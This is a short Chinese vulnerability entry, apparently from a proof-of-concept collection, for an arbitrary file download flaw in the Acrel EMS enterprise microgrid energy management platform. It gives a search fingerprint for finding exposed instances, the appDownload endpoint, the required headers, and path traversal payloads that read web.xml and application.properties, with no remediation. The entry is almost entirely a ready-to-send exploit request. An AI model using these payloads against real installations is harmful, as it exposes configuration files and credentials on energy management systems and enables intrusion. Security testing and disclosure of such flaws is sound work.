# 安科瑞EMS企业微电网能效管理平台appDownload存在任意文件下载漏洞

- **系统**：安科瑞EMS企业微电网能效管理平台　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/ECEMS/static/css/chunk-vue.dd1d6337.css"`
- **请求**：`POST /SubstationWEBV2/main/appDownload HTTP/1.1`
- **关键头**：`Api-Version: 2.0.0`　`response-lang: chinese`　`Content-Type: application/x-www-form-urlencoded`　`projectType: 4`

**请求体 / payload**
```
apkName=../../SubstationWEBV2/WEB-INF/web.xml
POST /SubstationWEBV2/main/appDownload HTTP/1.1
Host:
Api-Version: 2.0.0
response-lang: chinese
Content-Type: application/x-www-form-urlencoded
Authorization:
projectType: 4
apkName=../../SubstationWEBV2/WEB-INF/classes/application.properties
```
- **预期**：200　|　—